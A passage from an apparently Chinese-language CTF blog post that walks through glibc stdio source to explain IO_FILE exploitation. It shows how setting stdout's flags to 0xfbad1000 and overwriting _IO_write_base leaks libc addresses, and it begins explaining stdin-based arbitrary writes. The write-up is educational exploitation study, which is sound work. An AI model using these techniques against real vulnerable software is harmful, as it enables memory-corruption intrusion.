implementation.</span></span><br><span class="line"><span class="comment">     If the amount to be written straddles a block boundary</span></span><br><span class="line"><span class="comment">     (or the filebuf is unbuffered), use sys_write directly. */</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* First figure out how much space is available in the buffer. */</span></span><br><span class="line">  <span class="keyword">if</span> ((f-&gt;_flags &amp; _IO_LINE_BUF) &amp;&amp; (f-&gt;_flags &amp; _IO_CURRENTLY_PUTTING))</span><br><span class="line">    &#123;</span><br><span class="line">      count = f-&gt;_IO_buf_end - f-&gt;_IO_write_ptr;</span><br><span class="line">      <span class="keyword">if</span> (count &gt;= n)<span class="comment">//缓冲区长度大于数据长度</span></span><br><span class="line">	&#123;</span><br><span class="line">	  <span class="type">const</span> <span class="type">char</span> *p;</span><br><span class="line">	  <span class="keyword">for</span> (p = s + n; p &gt; s; )</span><br><span class="line">	    &#123;</span><br><span class="line">	      <span class="keyword">if</span> (*--p == <span class="string">&#x27;\n&#x27;</span>)<span class="comment">//寻找数据的结尾，并更新为count</span></span><br><span class="line">		&#123;</span><br><span class="line">		  count = p - s + <span class="number">1</span>;</span><br><span class="line">		  must_flush = <span class="number">1</span>;</span><br><span class="line">		  <span class="keyword">break</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	    &#125;</span><br><span class="line">	&#125;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> (f-&gt;_IO_write_end &gt; f-&gt;_IO_write_ptr)</span><br><span class="line">    count = f-&gt;_IO_write_end - f-&gt;_IO_write_ptr; <span class="comment">/* Space available. */</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Then fill the buffer. */</span></span><br><span class="line">  <span class="keyword">if</span> (count &gt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> (count &gt; to_do)</span><br><span class="line">	count = to_do;</span><br><span class="line">      f-&gt;_IO_write_ptr = __mempcpy (f-&gt;_IO_write_ptr, s, count);</span><br><span class="line">      s += count;</span><br><span class="line">      to_do -= count;<span class="comment">//to_do = 0</span></span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">if</span> (to_do + must_flush &gt; <span class="number">0</span>)<span class="comment">//刷新缓冲区</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="type">size_t</span> block_size, do_write;</span><br><span class="line">      <span class="comment">/* Next flush the (full) buffer. */</span></span><br><span class="line">      <span class="keyword">if</span> (_IO_OVERFLOW (f, EOF) == EOF)</span><br><span class="line">	<span class="comment">/* If nothing else has to be written we must not signal the</span></span><br><span class="line"><span class="comment">	   caller that everything has been written.  */</span></span><br><span class="line">	<span class="keyword">return</span> to_do == <span class="number">0</span> ? EOF : n - to_do;</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* Try to maintain alignment: write a whole number of blocks.  */</span></span><br><span class="line">      block_size = f-&gt;_IO_buf_end - f-&gt;_IO_buf_base;</span><br><span class="line">      do_write = to_do - (block_size &gt;= <span class="number">128</span> ? to_do % block_size : <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (do_write)</span><br><span class="line">	&#123;</span><br><span class="line">	  count = new_do_write (f, s, do_write);</span><br><span class="line">	  to_do -= count;</span><br><span class="line">	  <span class="keyword">if</span> (count &lt; do_write)</span><br><span class="line">	    <span class="keyword">return</span> n - to_do;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* Now write out the remainder.  Normally, this will fit in the</span></span><br><span class="line"><span class="comment">	 buffer, but it&#x27;s somewhat messier for line-buffered files,</span></span><br><span class="line"><span class="comment">	 so we let _IO_default_xsputn handle the general case. */</span></span><br><span class="line">      <span class="keyword">if</span> (to_do)</span><br><span class="line">	to_do -= _IO_default_xsputn (f, s+do_write, to_do);</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">return</span> n - to_do;</span><br><span class="line">&#125;</span><br><span class="line">libc_hidden_ver (_IO_new_file_xsputn, _IO_file_xsputn)</span><br></pre></td></tr></table></figure>

<p>真羡慕大爹们能读下去源码，我只能看大爹们分析好的，上面的源码大概实现了下面几个步骤</p>
<ol>
<li>判断缓冲区还有多少空间，这里通过 <code>f-&gt;_IO_buf_end - f-&gt;_IO_write_ptr</code> 实现</li>
<li>判断count与n的大小，若是缓冲区有剩余，则把count更新为数据的长度，同时设定 <code>must_flush</code> </li>
<li>如果缓冲区有数据（即  count&gt;0） ,判断count与to_do的长度，如果长度足够，就更新count为to_do的长度，并设置to_do为0</li>
<li>若缓冲区有剩余&#x2F;缓冲区已经满，就调用 <em>_IO_OVERFLOW</em> 刷新缓冲区</li>
<li>do_write</li>
</ol>
<p>现在我们已经进入到了 <em>_IO_OVERFLOW</em> 了，之后会调用 <em>_IO_new_fileoverflow</em> </p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span></span><br><span class="line">_IO_new_file_overflow (FILE *f, <span class="type">int</span> ch)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (f-&gt;_flags &amp; _IO_NO_WRITES) <span class="comment">/* SET ERROR */</span></span><br><span class="line">    &#123;</span><br><span class="line">      f-&gt;_flags |= _IO_ERR_SEEN;</span><br><span class="line">      __set_errno (EBADF);</span><br><span class="line">      <span class="keyword">return</span> EOF;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="comment">/* If currently reading or no buffer allocated. */</span></span><br><span class="line">  <span class="keyword">if</span> ((f-&gt;_flags &amp; _IO_CURRENTLY_PUTTING) == <span class="number">0</span> || f-&gt;_IO_write_base == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/* Allocate a buffer if needed. */</span></span><br><span class="line">      <span class="keyword">if</span> (f-&gt;_IO_write_base == <span class="literal">NULL</span>)</span><br><span class="line">	&#123;</span><br><span class="line">	  _IO_doallocbuf (f);</span><br><span class="line">	  _IO_setg (f, f-&gt;_IO_buf_base, f-&gt;_IO_buf_base, f-&gt;_IO_buf_base);</span><br><span class="line">	&#125;</span><br><span class="line">      <span class="comment">/* Otherwise must be currently reading.</span></span><br><span class="line"><span class="comment">	 If _IO_read_ptr (and hence also _IO_read_end) is at the buffer end,</span></span><br><span class="line"><span class="comment">	 logically slide the buffer forwards one block (by setting the</span></span><br><span class="line"><span class="comment">	 read pointers to all point at the beginning of the block).  This</span></span><br><span class="line"><span class="comment">	 makes room for subsequent output.</span></span><br><span class="line"><span class="comment">	 Otherwise, set the read pointers to _IO_read_end (leaving that</span></span><br><span class="line"><span class="comment">	 alone, so it can continue to correspond to the external position). */</span></span><br><span class="line">      <span class="keyword">if</span> (__glibc_unlikely (_IO_in_backup (f)))</span><br><span class="line">	&#123;</span><br><span class="line">	  <span class="type">size_t</span> nbackup = f-&gt;_IO_read_end - f-&gt;_IO_read_ptr;</span><br><span class="line">	  _IO_free_backup_area (f);</span><br><span class="line">	  f-&gt;_IO_read_base -= MIN (nbackup,</span><br><span class="line">				   f-&gt;_IO_read_base - f-&gt;_IO_buf_base);</span><br><span class="line">	  f-&gt;_IO_read_ptr = f-&gt;_IO_read_base;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (f-&gt;_IO_read_ptr == f-&gt;_IO_buf_end)</span><br><span class="line">	f-&gt;_IO_read_end = f-&gt;_IO_read_ptr = f-&gt;_IO_buf_base;</span><br><span class="line">      f-&gt;_IO_write_ptr = f-&gt;_IO_read_ptr;</span><br><span class="line">      f-&gt;_IO_write_base = f-&gt;_IO_write_ptr;</span><br><span class="line">      f-&gt;_IO_write_end = f-&gt;_IO_buf_end;</span><br><span class="line">      f-&gt;_IO_read_base = f-&gt;_IO_read_ptr = f-&gt;_IO_read_end;</span><br><span class="line"></span><br><span class="line">      f-&gt;_flags |= _IO_CURRENTLY_PUTTING;</span><br><span class="line">      <span class="keyword">if</span> (f-&gt;_mode &lt;= <span class="number">0</span> &amp;&amp; f-&gt;_flags &amp; (_IO_LINE_BUF | _IO_UNBUFFERED))</span><br><span class="line">	f-&gt;_IO_write_end = f-&gt;_IO_write_ptr;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">if</span> (ch == EOF)</span><br><span class="line">    <span class="keyword">return</span> _IO_do_write (f, f-&gt;_IO_write_base,</span><br><span class="line">			 f-&gt;_IO_write_ptr - f-&gt;_IO_write_base);</span><br><span class="line">  <span class="keyword">if</span> (f-&gt;_IO_write_ptr == f-&gt;_IO_buf_end ) <span class="comment">/* Buffer is really full */</span></span><br><span class="line">    <span class="keyword">if</span> (_IO_do_flush (f) == EOF)</span><br><span class="line">      <span class="keyword">return</span> EOF;</span><br><span class="line">  *f-&gt;_IO_write_ptr++ = ch;</span><br><span class="line">  <span class="keyword">if</span> ((f-&gt;_flags &amp; _IO_UNBUFFERED)</span><br><span class="line">      || ((f-&gt;_flags &amp; _IO_LINE_BUF) &amp;&amp; ch == <span class="string">&#x27;\n&#x27;</span>))</span><br><span class="line">    <span class="keyword">if</span> (_IO_do_write (f, f-&gt;_IO_write_base,</span><br><span class="line">		      f-&gt;_IO_write_ptr - f-&gt;_IO_write_base) == EOF)</span><br><span class="line">      <span class="keyword">return</span> EOF;</span><br><span class="line">  <span class="keyword">return</span> (<span class="type">unsigned</span> <span class="type">char</span>) ch;</span><br><span class="line">&#125;</span><br><span class="line">libc_hidden_ver (_IO_new_file_overflow, _IO_file_overflow)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>我们最终的目的是利用 <em>_IO_do_write</em> 那么我们就要一步步的绕过判断</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (f-&gt;_flags &amp; _IO_NO_WRITES) <span class="comment">/* SET ERROR */</span></span><br><span class="line">&#123;</span><br><span class="line">      f-&gt;_flags |= _IO_ERR_SEEN;</span><br><span class="line">      __set_errno (EBADF);</span><br><span class="line">      <span class="keyword">return</span> EOF;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>首先是这里，对 <code>f-&gt;_flags &amp; _IO_NO_WRITES</code> 若为真，就会报错，所以有如下关系</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_MAGIC 0xFBAD0000</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_NO_WRITES 8</span></span><br><span class="line">_flags &amp; _IO_NO_WRITES = <span class="number">0</span> </span><br><span class="line">_flags = <span class="number">0xfbad0000</span></span><br></pre></td></tr></table></figure>

<p>接下来看第二个if</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ((f-&gt;_flags &amp; _IO_CURRENTLY_PUTTING) == <span class="number">0</span> || f-&gt;_IO_write_base == <span class="literal">NULL</span>)</span><br></pre></td></tr></table></figure>

<p>这里检测缓冲区是否为空，如果是空就进行初始化，如果初始化那我们之前的布局就没效果了，所以为了不进入这里，我们需要</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_MAGIC 0xFBAD0000</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_CURRENTLY_PUTTING 0x800</span></span><br><span class="line">f-&gt;_flags &amp; _IO_CURRENTLY_PUTTING = <span class="number">1</span></span><br><span class="line">_flags = <span class="number">0xfbad0800</span></span><br></pre></td></tr></table></figure>

<p>这样子我们就进入了 _<em>IO_do_write</em> </p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span></span><br><span class="line">_IO_new_do_write (FILE *fp, <span class="type">const</span> <span class="type">char</span> *data, <span class="type">size_t</span> to_do)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">return</span> (to_do == <span class="number">0</span></span><br><span class="line">	  || (<span class="type">size_t</span>) new_do_write (fp, data, to_do) == to_do) ? <span class="number">0</span> : EOF;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>（终于快结束了，好痛苦啊）</p>
<p>这里就没什么说的了，直接进入了 <em>new_do_write</em> </p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">size_t</span></span><br><span class="line"><span class="title function_">new_do_write</span> <span class="params">(FILE *fp, <span class="type">const</span> <span class="type">char</span> *data, <span class="type">size_t</span> to_do)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">size_t</span> count;</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_flags &amp; _IO_IS_APPENDING)</span><br><span class="line">    <span class="comment">/* On a system without a proper O_APPEND implementation,</span></span><br><span class="line"><span class="comment">       you would need to sys_seek(0, SEEK_END) here, but is</span></span><br><span class="line"><span class="comment">       not needed nor desirable for Unix- or Posix-like systems.</span></span><br><span class="line"><span class="comment">       Instead, just indicate that offset (before and after) is</span></span><br><span class="line"><span class="comment">       unpredictable. */</span></span><br><span class="line">    fp-&gt;_offset = _IO_pos_BAD;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> (fp-&gt;_IO_read_end != fp-&gt;_IO_write_base)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="type">off64_t</span> new_pos</span><br><span class="line">	= _IO_SYSSEEK (fp, fp-&gt;_IO_write_base - fp-&gt;_IO_read_end, <span class="number">1</span>);</span><br><span class="line">      <span class="keyword">if</span> (new_pos == _IO_pos_BAD)</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">      fp-&gt;_offset = new_pos;</span><br><span class="line">    &#125;</span><br><span class="line">  count = _IO_SYSWRITE (fp, data, to_do);</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_cur_column &amp;&amp; count)</span><br><span class="line">    fp-&gt;_cur_column = _IO_adjust_column (fp-&gt;_cur_column - <span class="number">1</span>, data, count) + <span class="number">1</span>;</span><br><span class="line">  _IO_setg (fp, fp-&gt;_IO_buf_base, fp-&gt;_IO_buf_base, fp-&gt;_IO_buf_base);</span><br><span class="line">  fp-&gt;_IO_write_base = fp-&gt;_IO_write_ptr = fp-&gt;_IO_buf_base;</span><br><span class="line">  fp-&gt;_IO_write_end = (fp-&gt;_mode &lt;= <span class="number">0</span></span><br><span class="line">		       &amp;&amp; (fp-&gt;_flags &amp; (_IO_LINE_BUF | _IO_UNBUFFERED))</span><br><span class="line">		       ? fp-&gt;_IO_buf_base : fp-&gt;_IO_buf_end);</span><br><span class="line">  <span class="keyword">return</span> count;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里我们选择进入if分支，因为else if中很多是不可控的，不太稳定，若进入if只需要</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_MAGIC 0xFBAD0000</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_IS_APPENDING 0x1000</span></span><br><span class="line">fp-&gt;_flags &amp; _IO_IS_APPENDING = <span class="number">1</span></span><br><span class="line">_flags = <span class="number">0xfbad1000</span></span><br></pre></td></tr></table></figure>

<p>综上，我们想要通过io来泄露libc只需要</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">_flag=<span class="number">0xfbad1000</span></span><br><span class="line"><span class="comment">/*设置_IO_write_base指向想要泄露的位置，_IO_write_ptr指向泄露结束的地址(不需要一定设置指向结尾，程序中自带地址足够泄露libc*/</span></span><br><span class="line"><span class="comment">/*一般来说直接覆盖_IO_write_base的最低位是\x00就可以了*/</span></span><br></pre></td></tr></table></figure>

<h4 id="利用-IO-2-1-stdin-任意地址写"><a href="#利用-IO-2-1-stdin-任意地址写" class="headerlink" title="利用__IO_2_1_stdin_ 任意地址写"></a>利用__IO_2_1_stdin_ 任意地址写</h4><p>既然有stdout让我们任意地址读，那同样的也有任意地址写，继续来看源码</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">size_t</span></span><br><span class="line">_IO_file_xsgetn (FILE *fp, <span class="type">void</span> *data, <span class="type">size_t</span> n)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">size_t</span> want, have;</span><br><span class="line">  <span class="type">ssize_t</span> count;</span><br><span class="line">  <span class="type">char</span> *s = data;</span><br><span class="line"></span><br><span class="line">  want = n;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_IO_buf_base == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/* Maybe we already have a push back pointer.  */</span></span><br><span class="line">      <span class="keyword">if</span> (fp-&gt;_IO_save_base != <span class="literal">NULL</span>)</span><br><span class="line">	&#123;</span><br><span class="line">	  <span class="built_in">free</span> (fp-&gt;_IO_save_base);</span><br><span class="line">	  fp-&gt;_flags &amp;= ~_IO_IN_BACKUP;</span><br><span class="line">	&#125;</span><br><span class="line">      _IO_doallocbuf (fp);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">while</span> (want &gt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      have = fp-&gt;_IO_read_end - fp-&gt;_IO_read_ptr;</span><br><span class="line">      <span class="keyword">if</span> (want &lt;= have)</span><br><span class="line">	&#123;</span><br><span class="line">	  <span class="built_in">memcpy</span> (s, fp-&gt;_IO_read_ptr, want);</span><br><span class="line">	  fp-&gt;_IO_read_ptr += want;</span><br><span class="line">	  want = <span class="number">0</span>;</span><br><span class="line">	&#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">	&#123;</span><br><span class="line">	  <span class="keyword">if</span> (have &gt; <span class="number">0</span>)</span><br><span class="line">	    &#123;</span><br><span class="line">	      s = __mempcpy (s, fp-&gt;_IO_read_ptr, have);</span><br><span class="line">	      want -= have;</span><br><span class="line">	      fp-&gt;_IO_read_ptr += have;</span><br><span class="line">	    &#125;</span><br><span class="line"></span><br><span class="line">	  <span class="comment">/* Check for backup and repeat */</span></span><br><span class="line">	  <span class="keyword">if</span> (_IO_in_backup (fp))</span><br><span class="line">	    &#123;</span><br><span class="line">	      _IO_switch_to_main_get_area (fp);</span><br><span class="line">	      <span class="keyword">continue</span>;</span><br><span class="line">	    &#125;</span><br><span class="line"></span><br><span class="line">	  <span class="comment">/* If we now want less than a buffer, underflow and repeat</span></span><br><span class="line"><span class="comment">	     the copy.  Otherwise, _IO_SYSREAD directly to</span></span><br><span class="line"><span class="comment">	     the user buffer. */</span></span><br><span class="line">	  <span class="keyword">if</span> (fp-&gt;_IO_buf_base</span><br><span class="line">	      &amp;&amp; want &lt; (<span class="type">size_t</span>) (fp-&gt;_IO_buf_end - fp-&gt;_IO_buf_base))</span><br><span class="line">	    &#123;</span><br><span class="line">	      <span class="keyword">if</span> (__underflow (fp) == EOF)</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">	      <span class="keyword">continue</span>;</span><br><span class="line">	    &#125;</span><br><span class="line"></span><br><span class="line">	  <span class="comment">/* These must be set before the sysread as we might longjmp out</span></span><br><span class="line"><span class="comment">	     waiting for input. */</span></span><br><span class="line">	  _IO_setg (fp, fp-&gt;_IO_buf_base, fp-&gt;_IO_buf_base, fp-&gt;_IO_buf_base);</span><br><span class="line">	  _IO_setp (fp, fp-&gt;_IO_buf_base, fp-&gt;_IO_buf_base);</span><br><span class="line"></span><br><span class="line">	  <span class="comment">/* Try to maintain alignment: read a whole number of blocks.  */</span></span><br><span class="line">	  count = want;</span><br><span class="line">	  <span class="keyword">if</span> (fp-&gt;_IO_buf_base)</span><br><span class="line">	    &#123;</span><br><span class="line">	      <span class="type">size_t</span> block_size = fp-&gt;_IO_buf_end - fp-&gt;_IO_buf_base;</span><br><span class="line">	      <span class="keyword">if</span> (block_size &gt;= <span class="number">128</span>)</span><br><span class="line">		count -= want % block_size;</span><br><span class="line">	    &#125;</span><br><span class="line"></span><br><span class="line">	  count = _IO_SYSREAD (fp, s, count);</span><br><span class="line">	  <span class="keyword">if</span> (count &lt;= <span class="number">0</span>)</span><br><span class="line">	    &#123;</span><br><span class="line">	      <span class="keyword">if</span> (count == <span class="number">0</span>)</span><br><span class="line">		fp-&gt;_flags |= _IO_EOF_SEEN;</span><br><span class="line">	      <span class="keyword">else</span></span><br><span class="line">		fp-&gt;_flags |= _IO_ERR_SEEN;</span><br><span class="line"></span><br><span class="line">	      <span class="keyword">break</span>;</span><br><span class="line">	    &#125;</span><br><span class="line"></span><br><span class="line">	  s += count;</span><br><span class="line">	  want -= count;</span><br><span class="line">	  <span class="keyword">if</span> (fp-&gt;_offset != _IO_pos_BAD)</span><br><span class="line">	    _IO_pos_adjust (fp-&gt;_offset, count);</span><br><span class="line">	&#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> n - want;</span><br><span class="line">&#125;</span><br><span class="line">libc_hidden_def (_IO_file_xsgetn)</span><br></pre></td></tr></table></figure>

<p>上面的源码做了下面这些事情</p>
<ol>
<li>判断缓冲区是否为空，若为空，调用 <em>IO_doallocbuf</em> 来初始化缓冲区，若是初始化缓冲区了那我不是直接g了，所以我们不能让他初始化</li>
<li>have来判断缓冲区是否有数据，如果有数据就把他给输出区域，很显然我们是不想让这样子的，这里我们一般构建 <code>fp-&gt;_IO_read_end = fp-&gt;_IO_read_ptr</code></li>
<li>当缓冲区不能满足需求时候，就会进入 <code>__underflow</code> 函数来读取数据</li>
</ol>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span></span><br><span class="line">_IO_new_file_underflow (FILE *fp)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">ssize_t</span> count;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* C99 requires EOF to be &quot;sticky&quot;.  */</span></span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_flags &amp; _IO_EOF_SEEN)</span><br><span class="line">    <span class="keyword">return</span> EOF;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_flags &amp; _IO_NO_READS)</span><br><span class="line">    &#123;</span><br><span class="line">      fp-&gt;_flags |= _IO_ERR_SEEN;</span><br><span class="line">      __set_errno (EBADF);</span><br><span class="line">      <span class="keyword">return</span> EOF;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_IO_read_ptr &lt; fp-&gt;_IO_read_end)</span><br><span class="line">    <span class="keyword">return</span> *(<span class="type">unsigned</span> <span class="type">char</span> *) fp-&gt;_IO_read_ptr;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_IO_buf_base == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/* Maybe we already have a push back pointer.  */</span></span><br><span class="line">      <span class="keyword">if</span> (fp-&gt;_IO_save_base != <span class="literal">NULL</span>)</span><br><span class="line">	&#123;</span><br><span class="line">	  <span class="built_in">free</span> (fp-&gt;_IO_save_base);</span><br><span class="line">	  fp-&gt;_flags &amp;= ~_IO_IN_BACKUP;</span><br><span class="line">	&#125;</span><br><span class="line">      _IO_doallocbuf (fp);</span><br><span 